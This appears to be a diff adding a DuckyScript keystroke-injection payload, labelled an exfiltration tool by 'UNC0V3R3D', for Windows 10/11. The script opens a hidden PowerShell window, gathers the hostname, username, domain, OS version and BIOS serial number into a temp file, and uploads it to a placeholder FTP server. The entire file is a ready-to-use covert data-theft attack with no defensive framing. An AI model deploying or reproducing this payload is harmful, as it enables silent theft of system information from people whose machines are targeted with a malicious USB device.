@@ -1,0 +1,39 @@
+REM Author: UNC0V3R3D
+REM Description: Collects system info and uploads it to an FTP server via PowerShell.
+REM Version: 1.0
+REM Category: Exfiltration
+REM Target: Windows 10/11
+REM Requirements: Internet connection, FTP server credentials
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1500
+STRING $info = "=== System Report ===`nHostname: $env:COMPUTERNAME`nUser: $env:USERNAME`nDomain: $env:USERDOMAIN`nOS: " + (Get-WmiObject Win32_OperatingSystem).Caption + "`nSerial: " + (Get-WmiObject Win32_BIOS).SerialNumber
+ENTER
+DELAY 400
+STRING $tmp = "$env:TEMP\report.txt"; $info | Out-File $tmp -Force
+ENTER
+STRING $ftp = 'ftp://FTP_SERVER_IP/report.txt'
+ENTER
+STRING $user = 'FTP_USERNAME'
+ENTER
+STRING $pass = 'FTP_PASSWORD'
+ENTER
+STRING $req = [System.Net.FtpWebRequest]::Create($ftp)
+ENTER
+STRING $req.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+ENTER
+STRING $req.Credentials = New-Object System.Net.NetworkCredential($user,$pass)
+ENTER
+STRING $bytes = [System.IO.File]::ReadAllBytes($tmp)
+ENTER
+STRING $req.ContentLength = $bytes.Length
+ENTER
+STRING $stream = $req.GetRequestStream(); $stream.Write($bytes,0,$bytes.Length); $stream.Close()
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+REM End of payload
